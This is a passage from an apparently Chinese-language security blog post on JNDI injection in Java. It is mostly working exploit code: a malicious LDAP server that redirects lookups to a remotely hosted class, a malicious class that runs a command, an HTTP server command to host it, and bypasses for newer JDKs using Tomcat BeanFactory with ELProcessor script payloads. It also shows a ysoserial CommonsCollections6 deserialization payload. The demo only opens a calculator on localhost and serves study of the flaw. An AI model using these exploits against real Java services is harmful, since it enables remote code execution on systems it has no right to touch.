class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.shlin;<br><br><span class="hljs-keyword">import</span> com.sun.deploy.cache.InMemoryLocalApplicationProperties;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LdapServer</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8000/#Calc&quot;</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1234</span>;<br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);<br>            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                <span class="hljs-string">&quot;listen&quot;</span>,<br>                InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),<br>                port,<br>                ServerSocketFactory.getDefault(),<br>                SocketFactory.getDefault(),<br>                (SSLSocketFactory) SSLSocketFactory.getDefault()<br>            ));<br>            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url)));<br>            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port);<br>            ds.startListening();<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br>        <span class="hljs-keyword">private</span> URL codebase;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span><span class="hljs-params">(URL url)</span> &#123;<br>            <span class="hljs-built_in">this</span>.codebase = url;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span><span class="hljs-params">(InMemoryInterceptedSearchResult result)</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">baseDN</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(baseDN);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result, baseDN, e);<br>            &#125; <span class="hljs-keyword">catch</span> (LDAPException ex) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(ex);<br>            &#125; <span class="hljs-keyword">catch</span> (MalformedURLException ex) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(ex);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> LDAPException, MalformedURLException, MalformedURLException, LDAPException &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br>            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;Exploit&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);<br>            <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;<br>                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);<br>            &#125;<br>            e.addAttribute(<span class="hljs-string">&quot;javaCodeBase&quot;</span>, cbstring);<br>            e.addAttribute(<span class="hljs-string">&quot;objectClass&quot;</span>, <span class="hljs-string">&quot;javaNamingReference&quot;</span>);<br>            e.addAttribute(<span class="hljs-string">&quot;javaFactory&quot;</span>, <span class="hljs-built_in">this</span>.codebase.getRef());<br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后再来编写客户端client的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.shlin;<br><br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> shlin</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> jndi</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.shlin.LdapClient.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/10/12 13:10</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LdapClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.lookup(<span class="hljs-string">&quot;ldap://localhost:1234/Calc&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后再来编辑恶意类Calc.java并编译，这里有个需要注意的问题，这个恶意类请不要带上package的标签，eg：<code>package com.***;</code>，不然可能没法成功弹出计算器，会报错</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> shlin</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> jndi</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.shlin.Calc.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/10/12 13:14</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Calc</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译完成了恶意类后得到<code>Calc.class</code>，然后再<code>Calc.class</code>的目录下用python起一个http服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m http.server 8000<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071834250.png"></p><ul><li>这个攻击就还是我们之前说的 Reference</li></ul><p>注意一点就是，LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，com.sun.jndi.ldap.object.trustURLCodebase属性的默认值被设置为false，对LDAP+Reference远程工厂类的加载增加了限制。</p><p>所以，当JDK版本介于8u191、7u201、6u211与8u121、7u131、6u141之间时，我们就可以利用LDAP+Reference的技巧来进行JNDI注入的利用。</p><p>因此，这种利用方式的前提条件就是目标环境的JDK版本在JDK8u191、7u201、6u211以下。</p><h2 id="2-3-jndi结合CORBA"><a href="#2-3-jndi结合CORBA" class="headerlink" title="2.3 jndi结合CORBA"></a>2.3 jndi结合CORBA</h2><p>一个简单的流程是：<code>resolve_str</code> 最终会调用到 <code>StubFactoryFactoryStaticImpl.createStubFactory</code> 去加载远程 class 并调用 newInstance 创建对象，其内部使用的 ClassLoader 是 <code>RMIClassLoader</code>，在反序列化 stub 的上下文中，默认不允许访问远程文件，因此这种方法在实际场景中比较少用。所以就不深入研究了。</p><h1 id="三、绕过高版本jdk的攻击"><a href="#三、绕过高版本jdk的攻击" class="headerlink" title="三、绕过高版本jdk的攻击"></a>三、绕过高版本jdk的攻击</h1><h2 id="3-1-jdk8u121"><a href="#3-1-jdk8u121" class="headerlink" title="3.1 jdk8u121&lt;jdk_version&lt;jdk8u191"></a>3.1 jdk8u121&lt;jdk_version&lt;jdk8u191</h2><p>介于 121 和 191 版本之间的 jdk8 可以通过一些手段利用 JNDI 注入漏洞；可以通过 ldap+reference  进行利用，如上所述；</p><p>这个漏洞出现的原因在于 JNDI 本身，可以先来看看在 jdk8u191 之后的版本进行了哪些 patch；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 旧版本的jdk（jdk-version &lt; jdk8u191）</span><br><span class="hljs-keyword">public</span> Class&lt;?&gt; loadClass(String className, String codebase) <br><span class="hljs-keyword">throws</span> ClassNotFoundException, MalformedURLException &#123;<br>    <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">parent</span> <span class="hljs-operator">=</span> getContextClassLoader();<br>    <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">cl</span> <span class="hljs-operator">=</span> URLClassLoader.newInstance(getUrlArray(codebase), parent);<br>    <span class="hljs-keyword">return</span> loadClass(className, cl);<br>&#125;<br><br><span class="hljs-comment">// 新版本的jdk（jdk-version &gt;= jdk8u191）</span><br><span class="hljs-keyword">public</span> Class&lt;?&gt; loadClass(String className, String codebase)<br><span class="hljs-keyword">throws</span> ClassNotFoundException, MalformedURLException&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;true&quot;</span>.equalsIgnoreCase(trustURLCodebase))&#123;<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">parent</span> <span class="hljs-operator">=</span> getContextClassLoader();<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> URLClassLoader.newInstance(getUrlArray(codebase), parent);<br>        <span class="hljs-keyword">return</span> loadClass(className, c1);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>自从 jdk8u191 更新以后，在使用<code>URLClassLoader</code>远程类加载器之前增加了一个 if 判断，根据 <code>trustURLCodebase的值是否为true</code> 的值来进行判断，它的值默认为 false。通俗的来说，jdk8u191 之后的版本通过添加 <code>trustURLCodebase 的值是否为 true</code> 这一手段，让我们无法加载 codebase，也就是无法让我们进行 URLClassLoader 的攻击了。</p><h2 id="3-2-jdk-version-jdk8u191"><a href="#3-2-jdk-version-jdk8u191" class="headerlink" title="3.2 jdk_version&gt;&#x3D;jdk8u191"></a>3.2 jdk_version&gt;&#x3D;jdk8u191</h2><h3 id="利用本地恶意-Class-作为-Reference-Factory"><a href="#利用本地恶意-Class-作为-Reference-Factory" class="headerlink" title="利用本地恶意 Class 作为 Reference Factory"></a>利用本地恶意 Class 作为 Reference Factory</h3><p>根据我们之前说的，在 jdk8u191 后增加了一个是否本地类的判断，那么……只要恶意类在服务端不就行了吗，如此简单；</p><p>简单地说，就是要服务端本地 ClassPath 中存在恶意 Factory 类可被利用来作为 Reference Factory 进行攻击利用。该恶意 Factory 类必须实现<code>javax.naming.spi.ObjectFactory</code>接口，实现该接口的 getObjectInstance() 方法。</p><p>大佬找到的是这个 <code>org.apache.naming.factory.BeanFactory</code> 类，其满足上述条件并存在于 Tomcat8 依赖包中，应用广泛。该类的 <code>getObjectInstance()</code> 函数中会通过反射的方式实例化 Reference 所指向的任意 Bean Class(Bean Class 就类似于我们之前说的那个CommonsBeanUtils 这种)，并且会调用 setter 方法为所有的属性赋值。而该 Bean Class 的类名、属性、属性值，全都来自于 Reference 对象，均是攻击者可控的。</p><ul><li>恶意客户端（以下 2 选 1）</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> jndi</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.JNDIBypassHighJava.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/12/7 17:38</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIBypassHighJava</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;[*]Evil RMI Server is Listening on port: 1099&quot;</span>);<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry( <span class="hljs-number">1099</span>);<br>        <span class="hljs-comment">// 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory</span><br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>,<br>                <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">// 强制将&#x27;x&#x27;属性的setter从&#x27;setX&#x27;变为&#x27;eval&#x27;, 详细逻辑见BeanFactory.getObjectInstance代码</span><br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>        <span class="hljs-comment">// 利用表达式执行命令</span><br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;)&quot;</span> +<br>                <span class="hljs-string">&quot;.newInstance().getEngineByName(\&quot;JavaScript\&quot;)&quot;</span> +<br>                <span class="hljs-string">&quot;.eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));<br>        System.out.println(<span class="hljs-string">&quot;[*]Evil command: calc&quot;</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(ref);<br>        registry.bind(<span class="hljs-string">&quot;Object&quot;</span>, referenceWrapper);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy;<br><br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> jndi</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.JNDIBypassHighJavaServerRebind.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/12/7 17:42</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIBypassHighJavaServerRebind</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">resourceRef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>,<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<br>                <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span> );<br>        resourceRef.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>        resourceRef.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>,<span class="hljs-string">&quot;Runtime.getRuntime().exe(&#x27;calc&#x27;)&quot;</span> ));<br>        initialContext.rebind(<span class="hljs-string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, resourceRef);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li>jndi 客户端</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy;<br><br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> jndi</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.JNDIBypassHighJavaClient.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/12/7 17:44</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIBypassHighJavaClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;rmi://localhost:1099/Object&quot;</span>;<br>        <span class="hljs-type">Context</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        context.lookup(uri);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="利用-ldap-返回序列化数据触发本地-gadget"><a href="#利用-ldap-返回序列化数据触发本地-gadget" class="headerlink" title="利用 ldap 返回序列化数据触发本地 gadget"></a>利用 ldap 返回序列化数据触发本地 gadget</h3><p><font style="color:rgb(80, 80, 92);">LDAP 服务端除了支持 JNDI Reference 这种利用方式外，还支持直接返回一个序列化的对象。如果 Java 对象的 javaSerializedData 属性值不为空，则客户端的 </font><code>obj.decodeObject()</code><font style="color:rgb(80, 80, 92);"> 方法就会对这个字段的内容进行反序列化。此时，如果服务端 ClassPath 中存在反序列化多功能利用 Gadget 如 CommonsCollections 库，那么就可以结合该 Gadget 实现反序列化漏洞攻击。</font></p><p><font style="color:rgb(80, 80, 92);">使用 ysoserial 工具生成 Commons-Collections 这条 Gadget 并进行 Base64 编码输出：</font></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial-master.jar CommonsCollections6 <span class="hljs-string">&#x27;calc&#x27;</span> | <span class="hljs-built_in">base64</span><br></code></pre></td></tr></table></figure><p><font style="color:rgb(80, 80, 92);">恶意 LDAP 服务器如下，主要是在 javaSerializedData 字段内填入刚刚生成的反序列化 payload 数据：</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span 